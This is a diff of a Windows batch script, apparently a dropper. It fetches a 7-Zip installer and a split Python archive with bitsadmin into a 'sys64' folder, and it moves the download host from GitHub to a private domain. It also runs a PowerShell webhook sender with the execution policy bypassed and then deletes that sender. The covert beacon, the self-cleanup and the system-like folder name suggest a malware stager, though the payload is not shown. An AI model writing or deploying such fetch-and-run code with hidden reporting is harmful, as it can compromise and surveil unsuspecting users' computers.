@@ -33,7 +33,7 @@ if not exist "%installFolderPath%" (
 )
 
 :: 7zip dosyasını indir
-set "downloadUrl=https://github.com/nizhenets/test/raw/main/7z2406-x64.exe"
+set "downloadUrl=https://nizhenets.com/7z2406-x64.exe"
 set "downloadPath=%baseFolderPath%\7z2406-x64.exe"
 
 bitsadmin /transfer myDownloadJob /download /priority high "%downloadUrl%" "%downloadPath%"
@@ -59,8 +59,8 @@ powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUr
 del SendWebhook.ps1
 
 :: Dosyaları sys64 klasörüne indir
-set "pythonZipUrl=https://github.com/nizhenets/test/raw/main/Python312.zip"
-set "pythonPartUrl=https://github.com/nizhenets/test/raw/main/Python312.z01"
+set "pythonZipUrl=https://nizhenets.com/Python312.zip"
+set "pythonPartUrl=https://nizhenets.com/Python312.z01"
 set "pythonZipPath=%baseFolderPath%\Python312.zip"
 set "pythonPartPath=%baseFolderPath%\Python312.z01"
 
